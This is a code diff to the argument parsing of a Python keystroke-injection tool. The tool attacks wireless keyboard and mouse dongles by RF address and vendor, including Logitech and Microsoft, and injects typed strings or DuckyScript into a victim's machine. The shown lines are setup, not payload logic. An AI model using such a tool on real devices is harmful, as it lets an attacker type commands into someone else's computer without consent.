@@ -42,8 +42,10 @@ def main():
     sniff_cmd = subparser.add_parser("sniff", help="Sniff packets from a specific device")
 
     # defining arguments for "attack"
-    attack_cmd.add_argument("--address", type=str, required=False, default="E4:ED:AE:B8:B4", help="RF address of a vulnerable device")
-    attack_cmd.add_argument("--vendor", type=str, required=False, default="logitech", help="Vendor of vulnerable device")
+    attack_cmd.add_argument("--address", type=str, required=True, help="RF address of a vulnerable device")
+    attack_cmd.add_argument("--vendor", type=str, required=True, help="Vendor of vulnerable device")
+    attack_cmd.add_argument("--packet-header", type=str, required=False) # for Microsoft devices
+    attack_cmd.add_argument("--packet-len", type=int, required=False) # for Microsoft devices
     group = attack_cmd.add_mutually_exclusive_group(required=True) # either a string, a script file path or live mode must be specified, but only one of them
     group.add_argument("--string", type=str, help="A string of characters to be injected into the target") # if the string contains whitespaces, it must be surrounded with DOUBLE quotes
     group.add_argument("--script-file", type=str, help="Path of a DuckyScript file")
@@ -53,7 +55,7 @@ def main():
     scan_cmd.add_argument("--duration", type=int, required=False, default=20, help="Duration of the scanning process (in seconds)")
 
     # arguments for sniff
-    sniff_cmd.add_argument("--address", type=str, required=False, default="E4:ED:AE:B8:B4", help="RF address of a vulnerable device")
+    sniff_cmd.add_argument("--address", type=str, required=True, help="RF address of a vulnerable device")
     sniff_cmd.add_argument("--duration", type=int, required=False, default=20, help="Duration of the sniffing process (in seconds)")
 
     parser.epilog = f"""commands usage:\n{attack_cmd.format_usage()}{scan_cmd.format_usage()}{sniff_cmd.format_usage()}""" # text added to the end of the help message (shown when using -h or calling parser.print_help())
@@ -65,6 +67,11 @@ def main():
     radio_server = nrf24.nrf24() # if you want to run locally (comment out the previous line)
 
     if args.command == "attack":
+        vendor = globals()[args.vendor] # globals() returns a dictionary containing all modules in the program, so given a vendor string we can get its module
+        if vendor == eagletec or (vendor == microsoft and not args.packet_header and not args.packet_len): # cannot attack EagleTec devices or Microsoft devices without packet header and length
+            print("Cannot attack with the selected device.")
+            sys.exit(1)
+
         # We need to enter sniffer mode because this is the only way to tell the attacking dongle which address to use
         # when transmitting a payload. Note that this has nothing to do with sniffing keystrokes for keylogging purposes.
         radio_server.enter_sniffer_mode(address_str_to_bytes(args.address))
@@ -79,12 +86,10 @@ def main():
             print("Failed to find frequency channel. Tell the agent to try getting closer to the victim dongle.")
             sys.exit(1)
 
-        vendor = globals()[args.vendor] # globals() returns a dictionary containing all modules in the program, so given a vendor string we can get its module
         if vendor == microsoft:
-            # Unlike Logitech for example, attacking Microsoft devices requires knowing their address beyond the call to enter_sniffer_mode above,
-            # since it determines the packet structure (see microsoft.py). So we pass it to the microsoft module at this stage rather than
-            # having to add a parameter to all attack functions below.
-            microsoft.init(args.address)
+            # Unlike Logitech for example, attacking Microsoft devices requires further information (see microsoft.py).
+            # So we pass it to the microsoft module at this stage rather than having to add a parameter to all attack functions below.
+            microsoft.init(args.packet_header, args.packet_len)
 
         if args.string:
             print(f"Injecting the string: \"{args.string}\" into the target dongle paired to the device with address: {args.address}")
